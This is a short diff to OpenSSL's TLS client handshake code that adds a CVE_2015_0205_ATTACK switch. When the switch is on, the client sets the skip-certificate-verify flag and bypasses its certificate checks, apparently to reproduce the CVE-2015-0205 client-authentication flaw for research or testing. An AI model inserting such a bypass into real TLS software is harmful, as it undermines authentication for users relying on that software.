@@ -2658,7 +2658,7 @@ int ssl3_send_client_key_exchange(SSL *s)
                     goto err;
             }
 
-            if (s->s3->flags & TLS1_FLAGS_SKIP_CERT_VERIFY) {
+            if (!CVE_2015_0205_ATTACK && (s->s3->flags & TLS1_FLAGS_SKIP_CERT_VERIFY)) {
                 /* Use client certificate key */
                 EVP_PKEY *clkey = s->cert->key->privatekey;
                 dh_clnt = NULL;
@@ -2706,7 +2706,7 @@ int ssl3_send_client_key_exchange(SSL *s)
             /* clean up */
             memset(p, 0, n);
 
-            if (s->s3->flags & TLS1_FLAGS_SKIP_CERT_VERIFY)
+            if (!CVE_2015_0205_ATTACK && (s->s3->flags & TLS1_FLAGS_SKIP_CERT_VERIFY))
                 n = 0;
             else {
                 /* send off the data */
@@ -3296,6 +3296,12 @@ int ssl3_send_client_verify(SSL *s)
 static int ssl3_check_client_certificate(SSL *s)
 {
     unsigned long alg_k;
+
+    if (CVE_2015_0205_ATTACK) {
+        s->s3->flags |= TLS1_FLAGS_SKIP_CERT_VERIFY;
+        return 1;
+    }
+
     if (!s->cert || !s->cert->key->x509 || !s->cert->key->privatekey)
         return 0;
     /* If no suitable signature algorithm can't use certificate */
